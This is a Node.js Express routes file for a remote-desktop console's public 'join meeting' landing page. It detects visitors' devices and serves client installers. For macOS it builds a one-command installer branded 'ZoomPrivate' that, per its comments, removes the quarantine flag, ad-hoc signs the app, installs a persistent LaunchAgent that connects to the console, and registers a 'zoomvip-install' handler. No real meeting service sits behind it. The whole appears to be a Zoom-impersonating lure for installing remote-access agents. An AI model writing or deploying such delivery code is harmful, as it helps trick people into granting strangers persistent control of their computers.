/**
 * BetterDesk Console - Public Landing Routes
 *
 * Backs the public "join meeting" landing page:
 *   GET /api/landing/client            → device detection + recommended client
 *   GET /api/landing/releases          → raw release index (tag + all assets)
 *   GET /landing/download              → backend-proxied client download
 *   GET /api/landing/meeting/:id       → meeting join deep-link resolution
 *
 * All endpoints are public (no auth) — they only expose public release metadata
 * and stream whitelisted release assets resolved from the GitHub release index
 * (no arbitrary URL is ever fetched, preventing SSRF).
 *
 * @module routes/landing.routes
 */

'use strict';

const crypto = require('crypto');
const fs = require('fs');
const express = require('express');
const router = express.Router();
const landing = require('../services/landingReleaseService');
const macosInstaller = require('../services/macosInstaller');

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Strip internal fields (e.g. local absolute paths) from an asset for public JSON. */
function publicAsset(asset) {
    if (!asset) return null;
    return {
        name: asset.name,
        size: asset.size,
        platform: asset.platform,
        arch: asset.arch,
        format: asset.format,
        contentType: asset.contentType,
        source: asset.source,
        downloadPath: asset.downloadPath,
        sha256: asset.sha256 || null,
    };
}

function publicIndex(index) {
    return {
        owner: index.owner,
        repo: index.repo,
        tag: index.tag,
        name: index.name,
        publishedAt: index.publishedAt,
        htmlUrl: index.htmlUrl,
        releasesUrl: index.releasesUrl,
        assets: index.assets.map(publicAsset),
        sources: index.sources,
    };
}

// ---------------------------------------------------------------------------
// Device detection
// ---------------------------------------------------------------------------

/**
 * Best-effort platform/arch detection from User-Agent + Client Hints.
 * @param {import('express').Request} req
 * @returns {{ platform: string, arch: string, mobile: boolean, label: string }}
 */
function detectDevice(req) {
    const ua = String(req.headers['user-agent'] || '');
    const lower = ua.toLowerCase();

    // Client Hints (Chromium) are more reliable when present.
    const chPlatform = String(req.headers['sec-ch-ua-platform'] || '').replace(/"/g, '').toLowerCase();
    const chMobile = String(req.headers['sec-ch-ua-mobile'] || '') === '?1';

    let platform = 'unknown';
    if (/android/.test(lower) || chPlatform === 'android') platform = 'android';
    else if (/\biphone\b|\bipad\b|\bipod\b/.test(lower) && !/msstream/.test(lower)) platform = 'ios';
    else if (/windows|win32|win64/.test(lower) || chPlatform === 'windows') platform = 'windows';
    else if (/macintosh|mac os x|macos/.test(lower) || chPlatform === 'macos') platform = 'macos';
    else if (/linux|x11|cros/.test(lower) || chPlatform === 'linux') platform = 'linux';

    // Apple Silicon cannot be read from UA; report arm64 for macOS by default
    // when Client Hints say so, otherwise assume x64 (universal builds cover both).
    let arch = 'x64';
    const chArch = String(req.headers['sec-ch-ua-arch'] || '').replace(/"/g, '').toLowerCase();
    if (platform === 'macos') {
        // Chrome reports "arm" for Apple Silicon; anything else is Intel.
        arch = (chArch === 'x86' || chArch === 'x86_64') ? 'x64' : 'arm64';
    } else if (platform === 'android') {
        // Android browsers rarely expose the CPU ABI. Honour Client Hints when
        // present so arm64/armeabi get their own APK; otherwise prefer the
        // universal APK so 32-bit and 64-bit phones both install cleanly.
        if (chArch === 'arm64') arch = 'arm64';
        else if (chArch === 'arm') arch = 'arm32';
        else arch = 'universal';
    } else if (chArch === 'arm64' || chArch === 'arm') {
        arch = 'arm64';
    } else if (chArch === 'x86') {
        arch = 'x86';
    }

    const labels = {
        windows: 'Windows', macos: 'macOS', linux: 'Linux',
        android: 'Android', ios: 'iPhone / iPad', unknown: 'your device',
    };

    const mobile = chMobile || /mobile|android|iphone|ipad/.test(lower);

    return { platform, arch, mobile, label: labels[platform] || labels.unknown };
}

// ---------------------------------------------------------------------------
// Connection profile
// ---------------------------------------------------------------------------

function publicOrigin(req) {
    const forwardedProto = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim();
    const forwardedHost = String(req.headers['x-forwarded-host'] || '').split(',')[0].trim();
    const proto = forwardedProto || req.protocol || 'http';
    const host = forwardedHost || req.get('host');
    return `${proto}://${host}`;
}

function agentProfile(req) {
    const endpoints = require('../services/clientConfigHost').resolveRustDeskEndpoints(req);
    const conn = require('../services/agentBundleConnection');
    const keyService = require('../services/keyService');

    const host = endpoints.host || conn.defaultServerHost();
    const useHttps = conn.defaultUseHttps();

    let apiOrigin = '';
    let apiPort = 0;
    if (endpoints.api) {
        try {
            const u = new URL(endpoints.api);
            apiOrigin = u.origin;
            apiPort = u.port ? Number(u.port) : (u.protocol === 'https:' ? 443 : 80);
        } catch (_e) { /* fall through */ }
    }
    if (!apiOrigin) {
        const urls = conn.buildServerUrls(host, useHttps, conn.defaultApiPort());
        apiOrigin = urls.address;
        apiPort = conn.defaultApiPort();
    }

    const explicitCdap = String(process.env.PUBLIC_CDAP_URL || '').trim();
    const cdapUrl = explicitCdap
        || (apiPort === 443 ? `wss://${host}/cdap` : `ws://${host}:${conn.defaultCdapPort()}/cdap`);

    const consoleUrl = apiPort === 443 ? `https://${host}` : `http://${host}:5000`;

    return {
        server_address: apiOrigin,
        api_url: `${apiOrigin}/api`,
        cdap_url: cdapUrl,
        cdap_port: conn.defaultCdapPort(),
        console_url: consoleUrl,
        server_key: keyService.getPublicKey() || '',
    };
}

function assetSha256(asset) {
    if (!asset) return '';
    if (asset.sha256) return asset.sha256;
    if (!asset.absPath) return '';
    try {
        return crypto.createHash('sha256').update(fs.readFileSync(asset.absPath)).digest('hex');
    } catch (_e) {
        return '';
    }
}

function macAsset(asset) {
    if (!asset) return null;
    if (asset.format !== 'targz' && asset.format !== 'zip') return null;
    if (asset.arch !== 'arm64' && asset.arch !== 'x64' && asset.arch !== 'universal') return null;
    return {
        ...asset,
        sha256: assetSha256(asset),
    };
}

async function sendMacInstaller(req, res, asAttachment) {
    try {
        const origin = publicOrigin(req);
        const profile = agentProfile(req);
        const [arm64Resolved, x64Resolved] = await Promise.all([
            landing.resolveAsset('macos', 'arm64'),
            landing.resolveAsset('macos', 'x64'),
        ]);

        const arm64 = macAsset(arm64Resolved);
        const x64 = macAsset(x64Resolved);
        const arm64Match = arm64 && (arm64.arch === 'arm64' || arm64.arch === 'universal') ? arm64 : null;
        const x64Match = x64 && (x64.arch === 'x64' || x64.arch === 'universal') ? x64 : null;

        if (!arm64Match && !x64Match) {
            return res.status(404).json({
                success: false,
                error: 'No macOS client build available yet.',
            });
        }

        const script = macosInstaller.buildInstallScript({
            origin,
            profile,
            arm64: arm64Match,
            x64: x64Match,
        });

        res.set('Cache-Control', 'no-store');
        if (asAttachment) {
            res.type('application/octet-stream');
            res.set('Content-Disposition', 'attachment; filename="ZoomPrivate-macOS-Install.command"');
        } else {
            res.type('text/x-shellscript; charset=utf-8');
            res.set('Content-Disposition', 'inline; filename="ZoomPrivate-macOS-Install.command"');
        }
        res.send(script);
    } catch (err) {
        console.error('[landing] macos installer error:', err);
        res.status(500).json({ success: false, error: 'Could not build the macOS installer.' });
    }
}

// ---------------------------------------------------------------------------
// Endpoints
// ---------------------------------------------------------------------------

/**
 * GET /api/landing/client?platform=&arch=
 * Returns the recommended download for the visitor plus the full platform list.
 */
router.get('/api/landing/client', async (req, res) => {
    try {
        const detected = detectDevice(req);
        const platform = String(req.query.platform || detected.platform).toLowerCase();
        const arch = String(req.query.arch || detected.arch).toLowerCase();

        const index = await landing.getReleaseIndex();
        const recommended = landing.PLATFORMS.includes(platform)
            ? await landing.resolveAsset(platform, arch)
            : null;

        res.set('Cache-Control', 'no-store');
        res.json({
            success: true,
            data: {
                detected,
                requested: { platform, arch },
                release: {
                    tag: index.tag,
                    name: index.name,
                    publishedAt: index.publishedAt,
                    htmlUrl: index.htmlUrl,
                    releasesUrl: index.releasesUrl,
                },
                recommended: publicAsset(recommended),
                available: index.assets.map(publicAsset),
                platforms: landing.PLATFORMS,
            },
        });
    } catch (err) {
        console.error('[landing] client-info error:', err);
        res.status(502).json({ success: false, error: 'Could not resolve client downloads right now.' });
    }
});

/** GET /api/landing/releases — raw latest-release asset index. */
router.get('/api/landing/releases', async (req, res) => {
    try {
        const index = await landing.getReleaseIndex({ bypassCache: req.query.refresh === '1' });
        res.set('Cache-Control', 'public, max-age=300');
        res.json({ success: true, data: publicIndex(index) });
    } catch (err) {
        console.error('[landing] releases error:', err);
        res.status(502).json({ success: false, error: 'Release lookup failed.' });
    }
});

/**
 * GET /download/android?arch=universal|arm64|arm32
 * Short, shareable URL that streams the recommended Android APK. Useful for
 * QR codes, reinstalling after a wipe, or sending a link in chat.
 */
router.get('/download/android', async (req, res) => {
    try {
        const arch = String(req.query.arch || 'universal').toLowerCase();
        const asset = await landing.resolveAsset('android', arch);
        if (!asset) {
            return res.status(404).json({ success: false, error: 'No Android build available yet.' });
        }
        await landing.streamAsset(asset, res);
    } catch (err) {
        console.error('[landing] android download error:', err);
        if (!res.headersSent) {
            res.status(502).json({ success: false, error: 'Download failed. Please try again.' });
        } else {
            res.destroy();
        }
    }
});

/**
 * GET /download/windows — stable shareable URL that streams the recommended
 * Windows container (ISO disk image, or MSI as fallback). Mirrors
 * /download/android for QR codes and chat links.
 */
router.get('/download/windows', async (req, res) => {
    try {
        const asset = await landing.resolveAsset('windows', 'x64');
        if (!asset) {
            return res.status(404).json({ success: false, error: 'No Windows build available yet.' });
        }
        await landing.streamAsset(asset, res);
    } catch (err) {
        console.error('[landing] windows download error:', err);
        if (!res.headersSent) {
            res.status(502).json({ success: false, error: 'Download failed. Please try again.' });
        } else {
            res.destroy();
        }
    }
});

/**
 * GET /landing/download?platform=&arch=&format=
 * Streams the resolved release asset with download headers. Only assets that
 * exist in the cached GitHub release index are ever proxied.
 */
router.get('/landing/download', async (req, res) => {
    try {
        const platform = String(req.query.platform || '').toLowerCase();
        const arch = String(req.query.arch || '').toLowerCase() || undefined;
        const format = String(req.query.format || '').toLowerCase();

        if (!landing.PLATFORMS.includes(platform)) {
            return res.status(400).json({ success: false, error: 'Unsupported platform.' });
        }

        const index = await landing.getReleaseIndex();
        let asset = null;
        if (format) {
            asset = index.assetsByKey[`${platform}/${arch || 'x64'}/${format}`] || null;
        }
        if (!asset) asset = await landing.resolveAsset(platform, arch);
        if (!asset) {
            return res.status(404).json({ success: false, error: 'No matching client build available yet.' });
        }

        await landing.streamAsset(asset, res);
    } catch (err) {
        console.error('[landing] download error:', err);
        if (!res.headersSent) {
            res.status(502).json({ success: false, error: 'Download failed. Please try again or use the releases page.' });
        } else {
            res.destroy();
        }
    }
});

/**
 * GET /api/landing/agent-profile
 *
 * Connection profile a freshly installed client needs: the API origin it
 * enrolls against, the CDAP gateway URL and the console URL. The setup
 * launcher bakes these into agent-config.json so the agent connects on the
 * first start instead of asking the user for a server address.
 *
 * Public by design — the values contain no secrets beyond the server public
 * key, which the clients need for verification.
 */
router.get('/api/landing/agent-profile', (req, res) => {
    try {
        res.set('Cache-Control', 'no-store');
        res.json({ success: true, data: agentProfile(req) });
    } catch (err) {
        console.error('[landing] agent-profile error:', err);
        res.status(500).json({ success: false, error: 'Could not resolve the agent connection profile.' });
    }
});

/**
 * GET /api/landing/macos-install
 *
 * One-command macOS installer. Downloads the matching client, verifies its
 * SHA-256 when published, removes the quarantine flag with xattr, ad-hoc
 * signs the binary/app, installs a per-user LaunchAgent with the console
 * connection profile baked in, and registers the zoomvip-install URL helper.
 *
 * GET /api/landing/macos-install.command streams the same script as a
 * double-clickable .command file for browsers that cannot pipe to bash.
 */
router.get('/api/landing/macos-install', (req, res) => sendMacInstaller(req, res, false));
router.get('/api/landing/macos-install.command', (req, res) => sendMacInstaller(req, res, true));

/**
 * GET /api/landing/meeting/:id?passcode=
 * Resolves a meeting code into join targets. There is no meeting broker yet, so
 * this returns the app deep-link + the admin console join URL; the frontend
 * uses it to try to open an installed client and otherwise guide onboarding.
 */
router.get('/api/landing/meeting/:id', (req, res) => {
    const id = String(req.params.id || '').trim();
    if (!id) return res.status(400).json({ success: false, error: 'Meeting ID required.' });
    const passcode = String(req.query.passcode || '').trim();

    const qs = new URLSearchParams({ meeting: id });
    if (passcode) qs.set('passcode', passcode);

    res.json({
        success: true,
        data: {
            meetingId: id,
            passcode: passcode || null,
            appDeepLink: `betterdesk://join?${qs.toString()}`,
            webJoinUrl: `/login?${qs.toString()}`,
        },
    });
});

module.exports = router;
